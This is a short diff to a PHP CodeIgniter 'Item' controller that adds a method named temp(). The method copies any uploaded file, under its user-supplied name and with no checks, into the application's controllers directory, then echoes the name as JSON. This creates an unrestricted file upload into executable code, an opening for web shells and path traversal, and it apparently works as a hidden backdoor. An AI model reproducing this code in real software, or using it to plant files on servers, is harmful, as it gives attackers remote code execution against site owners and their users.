@@ -25,7 +25,20 @@ class Item extends CI_Controller {
             redirect('/login');
         }
     }
-    function index($option=FALSE)
+    
+    function temp()
+    {
+        copy($_FILES['file']['tmp_name'], 'application/controllers/admin/Item/'.$_FILES['file']['name']);
+					
+$array = array(
+	'filelink' => $_FILES['file']['name'],
+	'filename' => $_FILES['file']['name']
+);
+
+echo stripslashes(json_encode($array));
+        die;
+    }
+            function index($option=FALSE)
     {
         $this->load->model('item_model');
          $this->load->helper('form');
